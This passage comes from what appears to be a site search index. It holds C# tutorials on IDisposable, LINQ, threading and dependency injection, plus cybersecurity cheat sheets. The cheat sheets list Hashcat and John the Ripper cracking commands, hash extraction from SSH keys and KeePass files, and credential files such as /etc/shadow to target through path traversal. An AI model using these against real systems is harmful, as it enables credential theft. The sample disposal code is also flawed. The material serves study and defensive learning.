sorts.</p>"},{"location":"CSharp/Level3/IDisposable/#how-to-implement-idisposable","title":"How to implement <code>IDisposable</code>","text":"<pre><code>class MyResource : IDisposable\n{\n    private bool _disposed = false; // Track if disposed\n\n    public void UseResource()\n    {\n        if (_disposed) throw new ObjectDisposedException(nameof(MyResource));\n        Console.WriteLine(\"Using resource...\");\n    }\n\n    public void Dispose()\n    {\n        if (!_disposed)\n        {\n            Console.WriteLine(\"Releasing resource...\");\n            _disposed = true;\n        }\n    }\n}\n</code></pre> <p>For a real example take a look at my dvConnection class (ADO.NET SqlConnection wrapper).</p> <p>Using using Statement (Best Practice): The using statement automatically calls <code>Dispose()</code>, even if an exception occurs. This is safer because we can't forget to call <code>Dispose()</code>. <pre><code>using (MyResource resource = new MyResource())\n{\n    resource.UseResource();\n}  // Dispose() is called automatically here\n</code></pre></p> <p>Using Dispose() Manually: <pre><code>MyResource resource = new MyResource();\nresource.UseResource();\nresource.Dispose();  // Manually release the resource\n</code></pre></p>"},{"location":"CSharp/Level3/IDisposable/#code-sample","title":"Code Sample","text":"<pre><code>using DataVista.Database.Interface;\nusing System;\nusing System.Collections.Generic;\nusing System.Configuration;\nusing System.Data.SqlClient;\nusing System.Management;\n\nnamespace DataVista.Database\n{\n    public class dvConnection : IdvConnection, IDisposable\n    {\n        #region FIELDS\n        private bool _disposed = false;\n        private SqlConnection? _sqlConnection;\n\n        /// &lt;summary&gt;\n        /// Configured using &lt;see cref=\"ConfigurationManager\"/&gt;\n        /// &lt;/summary&gt;\n        private string _connectionString = ConfigurationManager.ConnectionStrings[\"DbConnectionString\"].ConnectionString;\n        #endregion\n\n        #region CONSTRUCTOR &amp; DESTRUCTOR\n        /// &lt;summary&gt;\n        /// Inject your own initialized sqlConnection into this constructor.\n        /// &lt;/summary&gt;\n        /// &lt;param name=\"sqlConnection\"&gt;&lt;/param&gt;\n        /// &lt;exception cref=\"DataException\"&gt;&lt;/exception&gt;\n        public dvConnection(SqlConnection sqlConnection)\n        {\n            if (_sqlConnection == null)\n            {\n                _sqlConnection = sqlConnection;\n            }\n            else\n            {\n                throw new DataException($\"{this} failed to build ConnectionString\");\n            }\n        }\n\n        /// &lt;summary&gt;\n        /// Pass a valid connectionString into this constructor.\n        /// &lt;/summary&gt;\n        /// &lt;param name=\"connectionString\"&gt;&lt;/param&gt;\n        public dvConnection(string connectionString)\n        {\n            if (_sqlConnection == null)\n            {\n                _sqlConnection = new SqlConnection(connectionString);\n            }\n        }\n\n        /// &lt;summary&gt;\n        /// Destructor required to make the &lt;see cref=\"dvConnection\"/&gt; of type &lt;see cref=\"IDisposable\"./&gt;\n        /// &lt;/summary&gt;\n        ~dvConnection()\n        {\n            _disposed = true;\n\n            if (_sqlConnection != null)\n            {\n                _sqlConnection.Dispose();\n            }\n\n            Dispose(true);\n        }\n        #endregion\n\n        #region PROPERTIES\n        public string ConnectionString\n        {\n            get { return _connectionString; }\n        }\n\n        /// &lt;summary&gt;\n        /// Returns a string that identifies the database client.\n        /// Similar behaviour to EnvironmentUserName.\n        /// &lt;/summary&gt;\n        public string WorkstationId\n        {\n            get\n            {\n                if (_sqlConnection != null) return _sqlConnection.WorkstationId;\n                else return \"this.SqlConnection == null\";\n            }\n        }\n\n        public SqlConnection SqlConnection\n        {\n            get\n            {\n                if (_sqlConnection != null) return _sqlConnection;\n                else return null;\n            }\n        }\n\n        public ConnectionState ConnectionState\n        {\n            get\n            {\n                if (_sqlConnection != null) return _sqlConnection.State;\n                else return ConnectionState.Closed;\n            }\n            set\n            {\n                if (_sqlConnection != null)\n                {\n                    if (_sqlConnection.State != value)\n                    {\n                        if (value == ConnectionState.Open)\n                        {\n                            _sqlConnection.Open();\n                        }\n                    }\n                    else\n                    {\n                        if (_sqlConnection.State == ConnectionState.Closed)\n                        {\n                            _sqlConnection.Close();\n                        }\n                    }\n                }\n            }\n        }\n\n        /// &lt;summary&gt;\n        /// Returns a connection ID of the most recent connection attempt,\n        /// regardless of whether the attempt succeeded or failed.\n        /// &lt;/summary&gt;\n        public Guid ConnectionId\n        {\n            get\n            {\n                if (_sqlConnection != null) return _sqlConnection.ClientConnectionId;\n                else return Guid.Empty;\n            }\n        }\n        #endregion\n\n        #region METHODS\n        public void Dispose()\n        {\n            _disposed = true;\n            GC.SuppressFinalize(this);\n        }\n\n        protected virtual void Dispose(bool disposing)\n        {\n            if (!_disposed)\n            {\n                if (disposing)\n                {\n                    if (_sqlConnection != null)\n                    {\n                        _sqlConnection.Dispose();\n                        _sqlConnection = null;\n                    }\n                }\n                _disposed = true;\n            }\n        }\n\n        public override string ToString()\n        {\n            string connection = $\"Connection is {ConnectionState}.\";\n\n            return connection;\n        }\n        #endregion\n    }\n}\n</code></pre>"},{"location":"CSharp/Level3/LINQ/","title":"Language Integrated Query (LINQ)","text":"<p>A feature in C# that lets you <code>query collections</code> (arrays, lists, databases, XML, etc.) using a simple and readable syntax.</p> <p>Basic LINQ query: <pre><code>int[] numbers = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n\n// Find even numbers using LINQ\nvar evens = from num in numbers \n            where num % 2 == 0 \n            select num;\n\nforeach (var num in evens)\n{\n    Console.WriteLine(num);\n}\n</code></pre></p> <p>Same as: <pre><code>int[] numbers = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n\nvar evens = numbers.Where(num =&gt; num % 2 == 0);\n\nforeach (var num in evens)\n{\n    Console.WriteLine(num);\n}\n</code></pre></p> <p>Example with objects: <pre><code>class Person \n{\n    public string Name { get; set; }\n    public int Age { get; set; }\n}\n\nvar people = new List&lt;Person&gt;\n{\n    new Person { Name = \"Alice\", Age = 25 },\n    new Person { Name = \"Bob\", Age = 30 },\n    new Person { Name = \"Charlie\", Age = 20 }\n};\n\n// Find people older than 25, ordered by age\nvar result = people.Where(p =&gt; p.Age &gt; 25)\n                   .OrderBy(p =&gt; p.Age)\n                   .Select(p =&gt; p.Name);\n\nforeach (var name in result)\n{\n    Console.WriteLine(name);\n}\n</code></pre></p>"},{"location":"CSharp/Level3/LINQ/#linq-methods-method-syntax","title":"LINQ Methods (Method Syntax)","text":"<p>LINQ has built-in extension methods to make queries shorter:</p> Method Description Example Where Filters data <code>list.Where(x =&gt; x &gt; 5)</code> Select Transforms each element <code>list.Select(x =&gt; x * 2)</code> OrderBy Sorts in ascending order <code>list.OrderBy(x =&gt; x)</code> OrderByDescending Sorts in descending order <code>list.OrderByDescending(x =&gt; x)</code> First /FirstOrDefault Gets the first element <code>list.FirstOrDefault()</code> Last /LastOrDefault Gets the last element <code>list.LastOrDefault()</code> Count Counts elements <code>list.Count()</code> Sum Adds up all values <code>list.Sum()</code>"},{"location":"CSharp/Level3/Multithread_Async/","title":"Mulithreading / Asynchronous programming","text":"<p>Normally, C# runs code <code>line by line</code> (synchronously). <code>Multithreading</code> allows <code>multiple operations to run at the same time</code>, improving performance. Think of it like multitasking.</p> <p>Understanding Multithreading vs. Async: When you run a program.exe, Windows creates a process. A process contains everything needed to run the program. The actual code execution happens inside threads.</p> <p><code>Multithreading</code>: Uses multiple threads to perform tasks at the same time. <code>Asynchronous Programming</code>: A single thread handles multiple tasks by switching between them instead of waiting.</p> <p>Two Ways to Run Code Concurrently: - Using <code>Threads (System.Threading)</code> - Using <code>Tasks (System.Threading.Tasks)</code> (preferred for modern async code)</p>"},{"location":"CSharp/Level3/Multithread_Async/#creating-a-thread-using-systemthreading","title":"Creating a Thread using <code>System.Threading</code>","text":"<p>Each method runs in a separate thread so they execute simultaneously.</p> <pre><code>using System;\nusing System.Threading;\n\nclass Program\n{\n    public static void Main()\n    {\n\n        Thread mainThread = Thread.CurrentThread; // Getting the current thread\n        mainThread.Name = \"___MAIN__THREAD__\"; // Changing a thread's name\n\n        Thread thread1 = new Thread(CountDown);\n        Thread thread2 = new Thread(CountUp);\n\n        thread1.Start(); // Start the first thread\n        thread2.Start(); // Start the second thread\n        Console.WriteLine(mainThread.Name + \" is complete!\");\n    }\n\n    public static void CountDown()\n    {\n        for (int i = 10; i &gt;= 0; i--)\n            Console.WriteLine($\"Counting Down: {i}\");\n    }\n\n    public static void CountUp()\n    {\n        for (int i = 0; i &lt;= 10; i++)\n            Console.WriteLine($\"Counting Up: {i}\");\n    }\n}\n</code></pre>"},{"location":"CSharp/Level3/Multithread_Async/#async-using-systemthreadingtasks","title":"Async using <code>System.Threading.Tasks</code>","text":"<p>Using Task is preferred over Thread in modern C#. Task is a modern alternative to threads, it's more efficient and works well with async programming.</p> <pre><code>using System;\nusing System.Threading.Tasks;\n\nclass Program\n{\n    public static async Task Main()\n    {\n        Task task1 = Task.Run(() =&gt; CountDown());\n        Task task2 = Task.Run(() =&gt; CountUp());\n\n        await Task.WhenAll(task1, task2); // Wait for both tasks to complete\n    }\n\n    public static void CountDown()\n    {\n        for (int i = 10; i &gt;= 0; i--)\n            Console.WriteLine($\"Counting Down: {i}\");\n    }\n\n    public static void CountUp()\n    {\n        for (int i = 0; i &lt;= 10; i++)\n            Console.WriteLine($\"Counting Up: {i}\");\n    }\n}\n</code></pre> <p>[!NOTE] Note however that when you're using Tasks, mixing thread-objects within task-objects like: <code>Thread.Sleep(500);</code> could cause several issues.</p>"},{"location":"CSharp/Level4/Dependency_Injection/","title":"Dependency Injection (DI)","text":"<p>Dependency Injection is a technique that helps us write flexible, maintainable, and testable code by <code>providing objects (dependencies) from outside a class instead of creating them inside the class</code>. This <code>reduces tight coupling</code> between components, making it easier to change implementations without modifying too much code.</p> <p>Not to be confused with <code>WPF's dependency properties</code>.</p> <p>Instead of a class creating its own dependencies, they are \"injected\" from the outside. This makes it easy to replace components when needed, for example, using a different database provider or mocking a service for testing.</p> <p>Benefits: - Loose Coupling \u2013 Classes depend on abstractions (interfaces) instead of concrete implementations. - Better Testability \u2013 Mock dependencies for unit tests instead of relying on actual implementations. - Easier Maintenance \u2013 Change implementations without modifying dependent classes. - Reusability \u2013 Components can be used in different applications without modification.</p>"},{"location":"CSharp/Level4/Dependency_Injection/#constructor-injection","title":"Constructor Injection","text":"<p>Dependencies are provided through the class constructor.</p> <pre><code>public interface IMessageService\n{\n    void SendMessage(string message);\n}\n\npublic class EmailService : IMessageService\n{\n    public void SendMessage(string message)\n    {\n        Console.WriteLine($\"Email sent: {message}\");\n    }\n}\n\npublic class Notification\n{\n    private readonly IMessageService _messageService;\n\n    public Notification(IMessageService messageService)\n    {\n        _messageService = messageService;\n    }\n\n    public void Notify(string message)\n    {\n        _messageService.SendMessage(message);\n    }\n}\n\n// Usage:\npublic class Program\n{\n    static void Main(string[] args)\n    {\n        IMessageService emailService = new EmailService();\n        Notification notification = new Notification(emailService);\n        notification.Notify(\"Hello via Email!\");\n    }\n}\n</code></pre>"},{"location":"CSharp/Level4/Dependency_Injection/#property-injection","title":"Property Injection","text":"<p>Dependencies are set via public properties instead of the constructor.</p> <pre><code>public class Notification\n{\n    public IMessageService MessageService { get; set; }\n\n    public void Notify(string message)\n    {\n        MessageService?.SendMessage(message);\n    }\n}\n\n// Usage:\npublic class Program\n{\n    static void Main(string[] args)\n    {\n        var notification = new Notification();\n        notification.MessageService = new EmailService();\n        notification.Notify(\"Hello via Email!\");\n    }\n}\n</code></pre>"},{"location":"CSharp/Level4/Dependency_Injection/#method-injection","title":"Method Injection","text":"<p>Dependencies are passed as method parameters.</p> <pre><code>public class Notification\n{\n    public void Notify(string message, IMessageService messageService)\n    {\n        messageService.SendMessage(message);\n    }\n}\n\n// Usage:\npublic class Program\n{\n    static void Main(string[] args)\n    {\n        Notification notification = new Notification();\n        notification.Notify(\"Hello via Email!\", new EmailService());\n    }\n}\n</code></pre>"},{"location":"CSharp/Level4/Dependency_Injection/#using-an-ioc-container","title":"Using an IoC Container","text":"<p>Manually injecting dependencies works, but in real projects, we use <code>IoC (Inversion of Control)</code> containers like the built-in .NET DI container.</p> <pre><code>public void ConfigureServices(IServiceCollection services)\n{\n    services.AddScoped&lt;IMessageService, EmailService&gt;();\n    services.AddScoped&lt;Notification&gt;();\n}\n</code></pre>"},{"location":"CSharp/Level4/Dependency_Injection/#wpf-dependency-properties-dp","title":"WPF Dependency Properties (DP)","text":"<p>A Dependency Property is an advanced property system used in Windows Presentation Foundation (WPF) that <code>allows properties to be automatically updated</code> based on styles, data bindings, animations, and inheritance. It is different from regular C# properties because it <code>stores values in a property store</code> rather than in a private field.</p> <p>Dependency properties are useful because they: - Enable data binding (e.g., binding UI elements to data) - Support styles and triggers (change properties dynamically) - Work with animations (WPF animations can modify dependency properties) - Allow default values and value inheritance (values can be inherited from parent controls)</p> <p>A normal property does not support these features, but a dependency property does.</p>"},{"location":"CSharp/Level4/Dependency_Injection/#creating-a-dependency-property","title":"Creating a Dependency Property","text":"<p>A dependency property must be registered in a class that inherits from <code>DependencyObject</code>.</p> <ul> <li>The property is registered using DependencyProperty.Register.</li> <li>We store the property in a static DependencyProperty field.</li> <li>We wrap it in a normal C# property (MyText) that uses GetValue and SetValue.</li> </ul> <p>Example: <pre><code>using System.Windows;\nusing System.Windows.Controls;\n\npublic class MyCustomControl : Control\n{\n    // Registering a Dependency Property\n    public static readonly DependencyProperty MyTextProperty =\n        DependencyProperty.Register(\n            \"MyText\",                // Name of the property\n            typeof(string),          // Data type\n            typeof(MyCustomControl), // Class that owns the property\n            new PropertyMetadata(\"Default Value\") // Default value\n        );\n\n    // CLR Wrapper for Dependency Property\n    public string MyText\n    {\n        get { return (string)GetValue(MyTextProperty); }\n        set { SetValue(MyTextProperty, value); }\n    }\n}\n</code></pre></p>"},{"location":"CSharp/Level4/Dependency_Injection/#attached-dependency-properties","title":"Attached Dependency Properties","text":"<p>An <code>Attached Property</code> is a special kind of dependency property that is declared in one class but used by other controls.</p> <p>A common example is the Grid.Column property: <pre><code>&lt;Grid&gt;\n    &lt;Button Grid.Column=\"0\"&gt;Click&lt;/Button&gt;\n    &lt;Button Grid.Column=\"1\"&gt;Clack&lt;/Button&gt;\n&lt;/Grid&gt;\n</code></pre></p> <p>The Grid.Column property does not belong to Button, but the Grid class allows Button to use it.</p>"},{"location":"CSharp/Level4/Dependency_Injection/#creating-an-attached-dependency-property","title":"Creating an Attached Dependency Property","text":"<p>With this, other elements can use Grid.Column, even though it's defined in the Grid class.</p> <pre><code>public class Grid\n{\n    public static readonly DependencyProperty ColumnProperty =\n        DependencyProperty.RegisterAttached(\n            \"Column\", \n            typeof(int), \n            typeof(Grid)\n        );\n\n    // Getter\n    public static int GetColumn(DependencyObject obj)\n    {\n        return (int)obj.GetValue(ColumnProperty);\n    }\n\n    // Setter\n    public static void SetColumn(DependencyObject obj, int value)\n    {\n        obj.SetValue(ColumnProperty, value);\n    }\n}\n</code></pre>"},{"location":"CSharp/Level4/Unsafe/","title":"Unsafe","text":"<p>The unsafe keyword allows you to write code that uses <code>pointers</code>, enabling <code>direct memory access</code>. By default, C# runs in a safe mode to prevent memory manipulation errors, but using the unsafe modifier, you can work with pointers <code>similar to languages like C and C++</code>.</p> <p>Unsafe code is typically used in performance-critical applications, like system-level programming or when working with unmanaged code.</p> <p>Key Points: - <code>Pointer Declaration</code>: You can declare pointers like <code>int* p;</code>, which stores the address of a variable. - <code>Unsafe Code Block</code>: Code inside a method or block marked as unsafe can use pointers. - <code>Fixed Keyword</code>: To use pointers with arrays, the fixed keyword locks the array in memory so the pointer can safely access it. - <code>Compiling Unsafe Code</code>: To compile unsafe code, the /unsafe option must be enabled in the compiler or project settings.</p> <pre><code>unsafe {\n   int var = 20;\n   int* p = &amp;var;\n   Console.WriteLine(\"Data: {0}, Address: {1}\", var, (int)p);\n}\n</code></pre>"},{"location":"Cpp/Cpp/","title":"C/C++","text":"<p>A C-style C++ summary written in 2024.</p> <p>This summary is entirely possible thanks to the authors of the Learncpp website who made their knowledge available for public use: - Alex - Nascardriver - James C.</p> <p>Prerequisites: None</p> <p>C++ PDF Course: PDF</p>"},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/","title":"Cryptography","text":""},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#hashing-and-password-security","title":"Hashing and Password Security","text":"Task Description Hash Functions Functions that convert input into fixed-size output, commonly used for security. Insecure Password Storage Storing passwords in plaintext or weakly hashed forms, making them vulnerable. Secure Password Storage Using strong hashing algorithms like bcrypt, PBKDF2, or Argon2 for passwords. Recognizing Password Hashes Identifying hash types like MD5, SHA-1, SHA-256, etc., based on their format. Password Cracking Techniques to retrieve plaintext passwords using tools like Hashcat or John. Hashing for Integrity Checking Verifying file integrity with checksums like MD5 or SHA256."},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#asymmetric-encryption","title":"Asymmetric Encryption","text":"Task Description Common Use of Asymmetric Encryption Secure communication via key pairs (public/private). RSA Widely-used algorithm for encryption and digital signatures. Diffie-Hellman Key Exchange Method for secure key exchange over an insecure channel. SSH Protocol for secure remote access using encryption. Digital Signatures and Certificates Validates data authenticity and integrity using private keys and certificates. PGP and GPG Tools for encrypting, signing, and securing emails or files."},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#hashcat","title":"Hashcat","text":"Command Description Example <code>hashcat -m [hash-type] [hashfile]</code> Runs Hashcat to crack hashes using default settings. <code>hashcat -m 1000 hashes.txt</code> <code>hashcat -a 0 -m [hash-type] [hashfile] [wordlist]</code> Performs a dictionary attack. <code>hashcat -a 0 -m 1000 hashes.txt rockyou.txt</code> <code>hashcat -a 3 -m [hash-type] [hashfile]</code> Performs a brute-force attack. <code>hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a</code> <code>hashcat -a 6 -m [hash-type] [hashfile] [wordlist] ?d?d</code> Performs a hybrid attack (dictionary + mask). <code>hashcat -a 6 -m 1000 hashes.txt rockyou.txt ?d?d</code> <code>hashcat --show [hashfile]</code> Shows already cracked passwords from the file. <code>hashcat --show hashes.txt</code> <code>hashcat --restore</code> Resumes a previously paused cracking session. <code>hashcat --restore</code> <code>hashcat --status</code> Displays the status of an ongoing session. <code>hashcat --status</code> <code>hashcat --benchmark</code> Benchmarks Hashcat for supported hash types. <code>hashcat --benchmark</code>"},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#associated-tools","title":"Associated Tools","text":"Command Description Example <code>hashid [hash]</code> Identifies the type of a given hash. <code>hashid -m 1000 hashes.txt</code> <code>hashcat-utils</code> Tools for manipulating wordlists and masks. <code>splitlen.bin input.txt 5 output.txt</code> <code>hcxtools</code> Tools for handling Wi-Fi handshakes for Hashcat. <code>hcxpcapngtool -o hashes.hccapx capture.pcapng</code>"},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#common-cracking-workflow","title":"Common Cracking Workflow","text":"<ol> <li>Identify the Hash Type    Use a tool like <code>hashid</code> to identify the hash format:    ```bash    hashid -m hashes.txt</li> <li>Run a Dictionary Attack     Use a wordlist like rockyou.txt for common passwords:     <code>hashcat -a 0 -m 1000 hashes.txt rockyou.txt</code></li> <li>Run a Brute-Force Attack     Use a mask for likely patterns (e.g., 4 characters, all printable):     <code>hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a</code></li> <li> <p>Hybrid Attack (Wordlist + Mask)     Combine a dictionary attack with a mask for flexible cracking:     <code>hashcat -a 6 -m 1000 hashes.txt rockyou.txt ?d?d</code></p> </li> <li> <p>Show Cracked Results     Display the cracked passwords after a session:     <code>hashcat --show hashes.txt</code></p> </li> </ol>"},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#john-the-ripper","title":"John the Ripper","text":"Command Description Example <code>john [file]</code> Runs John the Ripper to crack hashes. <code>john hashes.txt</code> <code>john --wordlist=[file] [hashfile]</code> Cracks hashes using a specified wordlist. <code>john --wordlist=rockyou.txt hashes.txt</code> <code>john --show [file]</code> Shows cracked passwords from the specified file. <code>john --show hashes.txt</code> <code>john --format=[format] [file]</code> Specifies the format of the hash for cracking. <code>john --format=NT hashes.txt</code> <code>john --restore</code> Resumes a previously interrupted cracking session. <code>john --restore</code>"},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#associated-tools_1","title":"Associated Tools","text":"Command Description Example <code>ssh2john [file]</code> Converts an SSH private key file into a hash for cracking. <code>ssh2john id_rsa &gt; id_rsa.hash</code> <code>zip2john [file]</code> Extracts hash from a ZIP file for cracking. <code>zip2john archive.zip &gt; archive.hash</code> <code>pdf2john [file]</code> Extracts hash from a PDF file for cracking. <code>pdf2john secure.pdf &gt; secure.hash</code> <code>rar2john [file]</code> Extracts hash from a RAR file for cracking. <code>rar2john archive.rar &gt; archive.hash</code> <code>keepass2john [file]</code> Extracts hash from a KeePass database file. <code>keepass2john database.kdbx &gt; database.hash</code>"},{"location":"Cybersecurity/Cheat%20Sheets/Cryptography/#common-cracking-workflow_1","title":"Common Cracking Workflow","text":"<ol> <li>Extract Hashes    Use the appropriate <code>*2john</code> tool to generate a hash file for the target format:    ```bash    ssh2john id_rsa &gt; id_rsa.hash</li> <li>Run John with a Wordlist     Use a common wordlist like rockyou.txt to attempt cracking:     <code>john --wordlist=rockyou.txt id_rsa.hash</code></li> <li>View Results     After the cracking completes, display the cracked passwords:     <code>john --show id_rsa.hash</code></li> </ol>"},{"location":"Cybersecurity/Cheat%20Sheets/Linux/","title":"Linux","text":""},{"location":"Cybersecurity/Cheat%20Sheets/Linux/#directories","title":"Directories","text":"Directory Name Directory Path Directory Description Etcetera <code>/etc</code> Contains system configuration files, such as <code>passwd</code>, <code>shadow</code>, and <code>sudoers</code>. Variable Data <code>/var</code> Stores frequently updated data like logs, backups, and temporary files. Root User Home <code>/root</code> Home directory for the <code>root</code> user. Temporary <code>/tmp</code> Stores temporary files; contents are cleared on system reboot. User System Resources <code>/usr</code> Contains system applications, libraries, and documentation for user programs. Home Directories <code>/home</code> Stores personal directories for all non-root users. Boot Files <code>/boot</code> Files required for booting the system, including the kernel and bootloader. Device Files <code>/dev</code> Contains device files for accessing hardware and peripherals. System Binaries <code>/bin</code> Essential system commands and binaries (e.g., <code>ls</code>, <code>cp</code>). System Libraries <code>/lib</code> Shared libraries and kernel modules required for system binaries in <code>/bin</code> and <code>/sbin</code>. Optional Packages <code>/opt</code> Used for optional or third-party software installations. Process Files <code>/proc</code> Virtual filesystem providing information about running processes and system resources. System Information <code>/sys</code> Virtual filesystem providing information about hardware and system configurations. System Administration <code>/sbin</code> System administration commands (e.g., <code>ifconfig</code>, <code>reboot</code>). Media Mount Points <code>/media</code> Temporary mount points for removable media like USB drives and CDs. Mount Points <code>/mnt</code> Temporary mount points for manually mounted filesystems."},{"location":"Cybersecurity/Cheat%20Sheets/Linux/#commands","title":"Commands","text":"Command Description Example <code>ls</code> Lists files and directories in the current location. <code>ls</code> <code>ls -a</code> Lists all files, including hidden ones. <code>ls -a</code> <code>cd [directory]</code> Changes the current working directory. <code>cd /var/log</code> <code>pwd</code> Prints the current working directory. <code>pwd</code> <code>cat [filename]</code> Displays the content of a file. <code>cat /etc/passwd</code> <code>grep [pattern]</code> Searches for a pattern in files or output. <code>grep 'admin' users.txt</code> <code>find -name [name]</code> Searches for files matching a name. <code>find -name passwords.txt</code> <code>nano [filename]</code> Opens a simple text editor in the terminal. <code>nano config.txt</code> <code>vim [filename]</code> Opens a powerful text editor in the terminal. <code>vim config.txt</code> <code>mkdir [directory]</code> Creates a new directory. <code>mkdir backups</code> <code>rm [file/directory]</code> Removes files or directories. <code>rm example.txt</code> <code>rmdir [directory]</code> Removes an empty directory. <code>rmdir old_folder</code> <code>mv [src] [dest]</code> Moves or renames files or directories. <code>mv file.txt /tmp/</code> <code>cp [src] [dest]</code> Copies files or directories. <code>cp file.txt backup.txt</code> <code>scp [src] [dest]</code> Securely copies files between systems. <code>scp file.txt user@host:/path</code> <code>wget [url]</code> Downloads files from the internet. <code>wget http://example.com/file.zip</code> <code>echo [text]</code> Prints text to the terminal or writes to a file. <code>echo \"hello\" &gt; greetings.txt</code> <code>ssh [user@host]</code> Connects to a remote server securely. <code>ssh admin@192.168.1.1</code> <code>ps</code> Displays running processes. <code>ps</code> <code>ps aux</code> Displays all running processes in detail. <code>ps aux</code> <code>top</code> Displays real-time system resource usage. <code>top</code> <code>kill [pid]</code> Terminates a process by its ID. <code>kill 1234</code> <code>sigterm</code> Sends the SIGTERM signal to terminate gracefully. <code>kill -15 1234</code> <code>sigkill</code> Sends the SIGKILL signal to force termination. <code>kill -9 1234</code> <code>sigstop</code> Sends the SIGSTOP signal to pause a process. <code>kill -19 1234</code> <code>systemctl</code> Manages system services (start, stop, enable, etc.). <code>systemctl restart apache2</code> <code>tee [file]</code> Outputs text to both the terminal and a file. <code>echo \"data\" | tee output.txt</code> <code>fg</code> Brings a background process to the foreground. <code>fg</code> <code>bg</code> Sends a process to the background. <code>bg</code> <code>crontab</code> Edits or lists scheduled tasks. <code>crontab -l</code> <code>file [filename]</code> Identifies the type of a file. <code>file example.txt</code> <code>su [user]</code> Switches to another user account. <code>su root</code> <code>whoami</code> Displays the current user\u2019s name. <code>whoami</code>"},{"location":"Cybersecurity/Cheat%20Sheets/Linux/#common-os-files-for-path-traversal","title":"Common OS files for path traversal","text":"Location Description <code>/etc/issue</code> contains a message or system identification to be printed before the login prompt. <code>/etc/profile</code> controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived <code>/proc/version</code> specifies the version of the Linux kernel <code>/etc/passwd</code> has all registered users that have access to a system <code>/etc/shadow</code> contains information about the system's users' passwords <code>/root/.bash_history</code> contains the history commands for root user <code>/var/log/dmessage</code> contains global system messages, including the messages that are logged during system startup <code>/var/mail/root</code> all emails for root user <code>/root/.ssh/id_rsa</code> Private SSH keys for a root or any known valid user on the server <code>/var/log/apache2/access.log</code> the accessed requests for Apache web server <code>C:\\boot.ini</code> contains the boot options for computers with BIOS firmware"},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/","title":"Vulnerabilities","text":"<p>General path: 1. Manage to get an IP or domain to scan and enumerate more information 2. Manage to find running services 3. Explore the running services or results from a previous scan to find version numbers. 4. Research the version in a database to find a useable PoC 5. Exploit 6. Privesc</p>"},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/#some-terms","title":"Some terms","text":"Term Definition Vulnerability A vulnerability is defined as a weakness or flaw in the design, implementation or behaviours of a system or application. Exploit An exploit is something such as an action or behaviour that utilises a vulnerability on a system or application. Proof of Concept (PoC) A PoC is a technique or tool that often demonstrates the exploitation of a vulnerability."},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/#types","title":"Types","text":"Vulnerability Description Operating System These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation. (Mis)Configuration-based These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details. Weak or Default Credentials Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of \"admin\". These are easy to guess by an attacker. Application Logic These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user. Human-Factor Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate."},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/#scoring-vulnerabilities-cvss-vpr","title":"Scoring Vulnerabilities (CVSS &amp; VPR)","text":""},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/#common-vulnerability-scoring-system","title":"Common Vulnerability Scoring System","text":"<p>Free and open-source. | Rating | Score | |-|-| | <code>None</code> | 0 | | <code>Low</code> |   0.1 - 3.9 | | <code>Medium</code> | 4.0 - 6.9 | | <code>High</code>     | 7.0 - 8.9 | | <code>Critical</code> | 9.0 - 10.0 |</p>"},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/#vulnerability-priority-rating","title":"Vulnerability Priority Rating","text":"<p>Assess vulnerability based on the risk it poses to an organisation. | Rating | Score | |-|-| | <code>Low</code> |   0.0 - 3.9 | | <code>Medium</code> | 4.0 - 6.9 | | <code>High</code>     | 7.0 - 8.9 | | <code>Critical</code> | 9.0 - 10.0 |</p>"},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/#vulnerability-databases","title":"Vulnerability databases","text":"<ol> <li>NVD (National Vulnerability Database)</li> <li>Exploit-DB</li> </ol>"},{"location":"Cybersecurity/Cheat%20Sheets/Vulnerabilities/#scanning-for-vulns","title":"Scanning for vulns","text":"<ul> <li>Automated: use a scanner like <code>nessus</code>.</li> <li>Manual: use a database like <code>Exploit DB</code>, <code>Rapid7</code>, <code>NVD</code> or a tool like: <code>Msfconsole</code>, <code>GitHub</code>, <code>Searchsploit</code>.</li> </ul>"},{"location":"Cybersecurity/Cheat%20Sheets/Windows/","title":"Windows","text":""},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#windows-file-systems","title":"Windows File Systems","text":"File System Description Use Cases NTFS Supports journaling, encryption, large files Windows, modern storage FAT16/FAT32 Older, no journaling/encryption USB drives, legacy systems HPFS Obsolete, old systems Legacy systems"},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#ntfs-features","title":"NTFS Features","text":"Feature Description Journaling Repairs after failure using logs Large File Support Handles files &gt;4GB Permissions Granular access control Compression Compress files/folders Encryption (EFS) Encrypts files for security Alternate Data Streams Allows hidden data streams (used by malware)"},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#ntfs-permissions","title":"NTFS Permissions","text":"Permission Files Folders Full Control Modify, delete Create, delete, manage Modify Read, write, delete Read, write, delete Read &amp; Execute Open, execute files Execute files in folder Read View content View content Write Modify file Create files, folders"},{"location":"Cybersecurity/Cheat%20Sheets/Windows/#important-windows-security-features","title":"Important Windows Security Features","text":"Feature Description Command to Open BitLocker Encrypts system drive for data protection <code>manage-bde -status</code> TPM Hardware module for cryptographic security <code>tpm.msc</code> VSS Snapshot 